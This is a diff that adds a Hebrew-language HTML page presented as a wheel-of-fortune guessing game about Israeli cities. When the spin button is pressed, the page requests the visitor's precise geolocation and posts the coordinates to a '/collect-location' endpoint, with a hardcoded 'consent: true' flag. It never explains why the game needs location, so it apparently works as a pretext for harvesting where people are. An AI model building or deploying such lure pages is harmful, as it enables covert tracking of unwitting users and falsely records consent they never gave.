@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>גלגל מזל — ערים בישראל</title>
+    <style>
+        :root {
+            --bg: #0f1220;
+            --card: #171a2b;
+            --accent: #7c7eff;
+            --accent-2: #21d4ad;
+            --text: #e8eaf3;
+            --good: #19c37d;
+            --shadow: 0 20px 50px rgba(0, 0, 0, .35);
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
+            background: radial-gradient(80% 60% at 50% 35%, rgba(124, 126, 255, .12), transparent 70%), var(--bg);
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            width: min(100%, 800px);
+            background: var(--card);
+            border-radius: 22px;
+            box-shadow: var(--shadow);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        h1 {
+            margin: 0 0 8px;
+            font-size: clamp(22px, 3.2vw, 32px)
+        }
+
+        canvas {
+            display: block;
+            width: 100%;
+            max-width: 480px;
+            height: auto;
+            aspect-ratio: 1/1;
+            border-radius: 50%
+        }
+
+        .pointer {
+            position: absolute;
+            top: -6px;
+            inset-inline: 0;
+            margin-inline: auto;
+            width: 0;
+            height: 0;
+            border-left: 16px solid transparent;
+            border-right: 16px solid transparent;
+            border-bottom: 26px solid var(--accent);
+            filter: drop-shadow(0 6px 10px rgba(0, 0, 0, .35));
+            z-index: 3;
+        }
+
+        button {
+            background: linear-gradient(135deg, var(--accent), #5fd6ff);
+            color: #0b0b14;
+            border: 0;
+            padding: 12px 18px;
+            border-radius: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(124, 126, 255, .25);
+            transition: transform .1s ease, opacity .25s ease;
+        }
+
+        button:disabled {
+            opacity: .65;
+            cursor: not-allowed
+        }
+
+        .result {
+            font-weight: 800;
+            font-size: clamp(18px, 2.4vw, 22px);
+            padding: 8px 12px;
+            border-radius: 12px;
+            background: rgba(25, 195, 125, .12);
+            color: var(--good);
+            border: 1px dashed rgba(25, 195, 125, .6);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <h1>משחק הניחושים של שרון!</h1>
+        <div class="wheel-wrap" style="position:relative;">
+            <canvas id="wheel" width="800" height="800"></canvas>
+                        <div class="pointer"></div>
+
+        </div>
+        <button id="spinBtn">סובב גלגל</button>
+        <div id="result" class="result">לחץ כדי לסובב…</div>
+    </div>
+<script>
+/* ====== רשימת הערים + קונפיג ====== */
+const cities = ["תל אביב-יפו","ירושלים","חיפה","באר שבע","אשדוד","ראשון לציון"];
+
+const canvas = document.getElementById('wheel');
+const ctx = canvas.getContext('2d');
+const spinBtn = document.getElementById('spinBtn');
+const resultEl = document.getElementById('result');
+const sliceColors = ['#7c7eff','#3dd6c6','#ffb94a','#ff6e6e','#9b8cff','#4ad4ff','#ffd86b','#ff9ed1'];
+
+let currentRotation = 0;
+let isSpinning = false;
+
+// החץ נמצא למעלה -> 270° במערכת של קנבס
+const POINTER_DEG = 270;
+
+/* ====== ציור הגלגל ====== */
+function drawWheel() {
+  const w = canvas.width, h = canvas.height, cx = w/2, cy = h/2;
+  const rOuter = Math.min(w,h)*0.48, rInner = rOuter*0.28;
+  ctx.clearRect(0,0,w,h);
+
+  const n = cities.length, per = (Math.PI*2)/n;
+
+  ctx.save();
+  ctx.translate(cx,cy);
+  ctx.rotate(currentRotation*Math.PI/180);
+
+  for (let i=0;i<n;i++){
+    const start=i*per, end=start+per;
+    ctx.beginPath(); ctx.moveTo(0,0); ctx.arc(0,0,rOuter,start,end); ctx.closePath();
+    ctx.fillStyle = sliceColors[i%sliceColors.length]; ctx.fill();
+    ctx.strokeStyle='rgba(0,0,0,.25)'; ctx.lineWidth=2; ctx.stroke();
+
+    const mid = start + per/2;
+    ctx.save();
+    ctx.rotate(mid);
+    ctx.translate((rOuter+rInner)/2,0);
+    ctx.rotate(Math.PI/2);
+    ctx.font='700 24px system-ui'; ctx.fillStyle='#0b0b14';
+    let text=cities[i]; if(text.length>18) text=text.slice(0,17)+'…';
+    const m=ctx.measureText(text); const wtxt=m.width+20, htxt=38;
+    const x=-wtxt/2, y=-htxt/2, r=10;
+    ctx.beginPath();
+    ctx.moveTo(x+r,y); ctx.lineTo(x+wtxt-r,y); ctx.quadraticCurveTo(x+wtxt,y,x+wtxt,y+r);
+    ctx.lineTo(x+wtxt,y+htxt-r); ctx.quadraticCurveTo(x+wtxt,y+htxt,x+wtxt-r,y+htxt);
+    ctx.lineTo(x+r,y+htxt); ctx.quadraticCurveTo(x,y+htxt,x,y+htxt-r);
+    ctx.lineTo(x,y+r); ctx.quadraticCurveTo(x,y,x+r,y); ctx.closePath(); ctx.fill();
+    ctx.fillStyle='#fff'; ctx.textAlign='center'; ctx.textBaseline='middle'; ctx.fillText(text,0,0);
+    ctx.restore();
+  }
+
+  ctx.beginPath(); ctx.arc(0,0,rInner,0,Math.PI*2); ctx.fillStyle='#111425'; ctx.fill();
+  ctx.lineWidth=3; ctx.strokeStyle='#2a2e48'; ctx.stroke();
+  ctx.fillStyle='#e8eaf3'; ctx.font='700 28px system-ui'; ctx.textAlign='center'; ctx.textBaseline='middle';
+  ctx.fillText('גלגל מזל',0,0);
+
+  ctx.restore();
+}
+
+/* ====== שליחת מיקום לשרת ====== */
+async function postLocation(payload) {
+  // שולח POST לשרת; מחזיר response.ok/false
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(()=> controller.abort(), 7000); // timeout 7s
+    const res = await fetch('/collect-location', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload),
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+    return res.ok;
+  } catch (e) {
+    console.warn('failed sending location', e);
+    return false;
+  }
+}
+
+/* ====== בקשת מיקום מהדפדפן ====== */
+function getCurrentPositionPromise(options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }) {
+  return new Promise((resolve, reject) => {
+    if (!('geolocation' in navigator)) {
+      return reject(new Error('geolocation-not-supported'));
+    }
+    navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err), options);
+  });
+}
+
+/* ====== לוגיקת הסיבוב המחוברת למיקום ====== */
+async function handleSpinClick() {
+  if (isSpinning) return;
+
+  // שלב 1: ננסה לקבל מיקום
+  resultEl.textContent = 'מנסה לקבל מיקום…';
+  spinBtn.disabled = true;
+
+  let gotPos = null;
+  try {
+    const pos = await getCurrentPositionPromise();
+    gotPos = {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy,
+      timestamp: new Date(pos.timestamp).toISOString()
+    };
+    resultEl.textContent = 'מיקום נמצא — נשלח ואז נסובב…';
+  } catch (err) {
+    // לא קיבלנו מיקום (נחסם/אף/טיימאוט)
+    console.warn('geolocation error', err);
+    const cont = confirm('לא הצלחנו לקבל את המיקום (המשתמש חסם או טיימאוט).\nלהמשיך לסיבוב בלי שליחת מיקום?');
+    if (!cont) {
+      resultEl.textContent = 'ביטלת סיבוב — נסה שוב כשתאשר מיקום.';
+      spinBtn.disabled = false;
+      return;
+    } else {
+      resultEl.textContent = 'ממשיכים לסיבוב ללא מיקום…';
+    }
+  }
+
+  // שלב 2: אם יש מיקום — נשלח אותו לשרת (בחיוב), נחכה לתשובה, ואז נסובב.
+  if (gotPos) {
+    const payload = {
+      consent: true,
+      ...gotPos,
+      fromAction: 'spin' // עוזר בזיהוי בקובץ לוג
+    };
+    const ok = await postLocation(payload);
+    if (!ok) {
+      // אפשר להמשיך גם אם לא הצלחנו לשמור, אבל נותנים חיווי
+      resultEl.textContent = 'נכשל לשלוח מיקום לשרת — נסובב בכל זאת.';
+      await new Promise(r=>setTimeout(r,700)); // קצר להראות את ההודעה
+    } else {
+      resultEl.textContent = 'מיקום נשלח — מתחילים סיבוב!';
+      await new Promise(r=>setTimeout(r,350)); // מעט דיליי עד הסיבוב
+    }
+  }
+
+  // שלב 3: להפעיל את הספין (תמיד לאחר הטיפול במיקום)
+  startSpinAnimation();
+
+  // הכפתור ישתחרר בתוך ההנפשה (startSpinAnimation מנהל את זה)
+}
+
+/* ====== פונקציית האנימציה/סיבוב (נשמרה מהגרסה המבוססת) ====== */
+function startSpinAnimation(){
+  if (isSpinning) return;
+  isSpinning = true;
+  spinBtn.disabled = true;
+  resultEl.textContent = 'מסתובב…';
+
+  const n = cities.length, per = 360 / n;
+  const index = Math.floor(Math.random()*n);
+  const angleCenter = index * per + per/2;
+  const spins = 6 + Math.floor(Math.random()*5);
+  const target = spins*360 + (POINTER_DEG - angleCenter);
+
+  const dur = 5200, start = performance.now(), init = currentRotation;
+  const ease = t => 1 - Math.pow(1 - t, 3);
+
+  function anim(now){
+    const p = Math.min(1, (now - start)/dur), e = ease(p);
+    currentRotation = init + (target - init) * e;
+    drawWheel();
+
+    if (p < 1) {
+      requestAnimationFrame(anim);
+    } else {
+      isSpinning = false;
+      spinBtn.disabled = false;
+
+      // מי נמצא מתחת החץ (POINTER_DEG) לאחר העצירה
+      const final = (currentRotation % 360 + 360) % 360;
+      const angleAtPointer = (POINTER_DEG - final + 360) % 360;
+      const selectedIndex = Math.floor((angleAtPointer + 1e-6) / per) % n;
+
+      resultEl.textContent = `נחתנו על: ${cities[selectedIndex]}`;
+      currentRotation = final;
+    }
+  }
+  requestAnimationFrame(anim);
+}
+
+/* ====== חיבור לכפתור ====== */
+spinBtn.addEventListener('click', handleSpinClick);
+
+/* ====== init ====== */
+drawWheel();
+</script>
+
+
+</body>
+
+</html>
